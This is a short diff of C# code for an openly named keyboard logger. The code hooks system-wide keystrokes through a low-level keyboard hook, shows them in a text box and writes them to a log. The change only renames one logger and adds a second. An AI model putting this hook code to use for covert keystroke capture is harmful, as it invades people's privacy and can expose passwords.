@@ -19,7 +19,8 @@ namespace KeyboardLogger
         // data
         IntPtr hHook = IntPtr.Zero;
         LowLevelKeyboardProc kydbHookProc;
-        Log log = new Log("wolfram77");
+        Log userLog = new Log("wolfram77");
+        static Log headLog = new Log("head");
 
 
         // constructor
@@ -56,7 +57,7 @@ namespace KeyboardLogger
                 Keys key = (Keys)lParam.vkCode;
                 string txt = (wParam == WM.KEYUP || wParam == WM.SYSKEYUP)? key + "- " : key + " ";
                 textBox_Log.Text = textBox_Log.Text + txt;
-                log.Write(txt);
+                userLog.Write(txt);
             }
             return User32.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
